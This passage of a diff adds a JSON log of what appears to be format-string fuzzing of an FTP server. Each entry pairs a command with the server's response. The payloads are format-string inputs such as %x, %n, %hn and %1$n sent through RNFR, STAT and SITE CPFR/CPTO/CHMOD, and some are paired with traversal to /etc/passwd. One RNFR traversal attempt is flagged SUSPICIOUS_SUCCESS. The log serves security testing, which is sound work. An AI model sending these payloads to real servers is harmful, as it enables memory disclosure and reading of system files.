+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 194,
+      "category": "format_string_RNFR",
+      "command": "RNFR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 195,
+      "category": "format_string_RNFR",
+      "command": "RNFR ../%x%x%x%x",
+      "response": "550 ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 196,
+      "category": "format_string_RNFR",
+      "command": "RNFR %x/../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 197,
+      "category": "format_string_STAT",
+      "command": "STAT %x",
+      "response": "450 %x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 198,
+      "category": "format_string_STAT",
+      "command": "STAT %s",
+      "response": "450 %s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 199,
+      "category": "format_string_STAT",
+      "command": "STAT %n",
+      "response": "450 %n: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 200,
+      "category": "format_string_STAT",
+      "command": "STAT %d",
+      "response": "450 %d: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 201,
+      "category": "format_string_STAT",
+      "command": "STAT %p",
+      "response": "450 %p: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 202,
+      "category": "format_string_STAT",
+      "command": "STAT %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "450 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 203,
+      "category": "format_string_STAT",
+      "command": "STAT %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "450 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 204,
+      "category": "format_string_STAT",
+      "command": "STAT %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "450 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 205,
+      "category": "format_string_STAT",
+      "command": "STAT %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "450 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 206,
+      "category": "format_string_STAT",
+      "command": "STAT %n%n%n%n",
+      "response": "450 %n%n%n%n: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 207,
+      "category": "format_string_STAT",
+      "command": "STAT %hn%hn%hn%hn",
+      "response": "450 %hn%hn%hn%hn: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 208,
+      "category": "format_string_STAT",
+      "command": "STAT %hhn%hhn%hhn%hhn",
+      "response": "450 %hhn%hhn%hhn%hhn: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 209,
+      "category": "format_string_STAT",
+      "command": "STAT %1$x",
+      "response": "450 %1$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 210,
+      "category": "format_string_STAT",
+      "command": "STAT %2$x",
+      "response": "450 %2$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 211,
+      "category": "format_string_STAT",
+      "command": "STAT %3$x",
+      "response": "450 %3$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 212,
+      "category": "format_string_STAT",
+      "command": "STAT %10$x",
+      "response": "450 %10$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 213,
+      "category": "format_string_STAT",
+      "command": "STAT %100$x",
+      "response": "450 %100$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 214,
+      "category": "format_string_STAT",
+      "command": "STAT %1$s",
+      "response": "450 %1$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 215,
+      "category": "format_string_STAT",
+      "command": "STAT %2$s",
+      "response": "450 %2$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 216,
+      "category": "format_string_STAT",
+      "command": "STAT %3$s",
+      "response": "450 %3$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 217,
+      "category": "format_string_STAT",
+      "command": "STAT %1$n",
+      "response": "450 %1$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 218,
+      "category": "format_string_STAT",
+      "command": "STAT %2$n",
+      "response": "450 %2$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 219,
+      "category": "format_string_STAT",
+      "command": "STAT AAAA%x%x%x%x",
+      "response": "450 AAAA%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 220,
+      "category": "format_string_STAT",
+      "command": "STAT AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "450 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 221,
+      "category": "format_string_STAT",
+      "command": "STAT %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "450 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 222,
+      "category": "format_string_STAT",
+      "command": "STAT %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "450 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 223,
+      "category": "format_string_STAT",
+      "command": "STAT ../%x%x%x%x",
+      "response": "450 ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 224,
+      "category": "format_string_STAT",
+      "command": "STAT %x/../../../etc/passwd",
+      "response": "450 %x/../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 225,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %x",
+      "response": "550 /home/ftptest/%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 226,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %s",
+      "response": "550 /home/ftptest/%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 227,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %n",
+      "response": "550 /home/ftptest/%n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 228,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %d",
+      "response": "550 /home/ftptest/%d: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 229,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %p",
+      "response": "550 /home/ftptest/%p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 230,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 /home/ftptest/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 231,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 /home/ftptest/%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 232,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "550 /home/ftptest/%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 233,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 /home/ftptest/%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 234,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %n%n%n%n",
+      "response": "550 /home/ftptest/%n%n%n%n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 235,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %hn%hn%hn%hn",
+      "response": "550 /home/ftptest/%hn%hn%hn%hn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 236,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %hhn%hhn%hhn%hhn",
+      "response": "550 /home/ftptest/%hhn%hhn%hhn%hhn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 237,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %1$x",
+      "response": "550 /home/ftptest/%1$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 238,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %2$x",
+      "response": "550 /home/ftptest/%2$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 239,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %3$x",
+      "response": "550 /home/ftptest/%3$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 240,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %10$x",
+      "response": "550 /home/ftptest/%10$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 241,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %100$x",
+      "response": "550 /home/ftptest/%100$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 242,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %1$s",
+      "response": "550 /home/ftptest/%1$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 243,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %2$s",
+      "response": "550 /home/ftptest/%2$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 244,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %3$s",
+      "response": "550 /home/ftptest/%3$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 245,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %1$n",
+      "response": "550 /home/ftptest/%1$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 246,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %2$n",
+      "response": "550 /home/ftptest/%2$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 247,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR AAAA%x%x%x%x",
+      "response": "550 /home/ftptest/AAAA%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 248,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 /home/ftptest/AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 249,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 /home/ftptest/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 250,
+      "category": "format_string_SITE_CPFR",
+      "command": "SITE CPFR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 /home/ftptest/%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 251,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 252,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 253,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %n",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 254,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %d",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 255,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %p",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 256,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 257,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 258,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 259,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 260,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %n%n%n%n",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 261,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %hn%hn%hn%hn",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 262,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %hhn%hhn%hhn%hhn",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 263,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %1$x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 264,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %2$x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 265,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %3$x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 266,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %10$x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 267,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %100$x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 268,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %1$s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 269,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %2$s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 270,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %3$s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 271,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %1$n",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 272,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %2$n",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 273,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO AAAA%x%x%x%x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 274,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 275,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 276,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 277,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO ../%x%x%x%x",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 278,
+      "category": "format_string_SITE_CPTO",
+      "command": "SITE CPTO %x/../../../etc/passwd",
+      "response": "503-Bad sequence of commands\r\n503 Bad sequence of commands\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 279,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %x",
+      "response": "500-'SITE CHMOD %x' not understood\r\n500 SITE not understood\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 280,
+      "category": "format_string_SITE_CHMOD",
+      "command": "SITE CHMOD %s",
+      "response": "500-'SITE CHMOD %s' not understood\r\n500 SITE not understood\r\n",
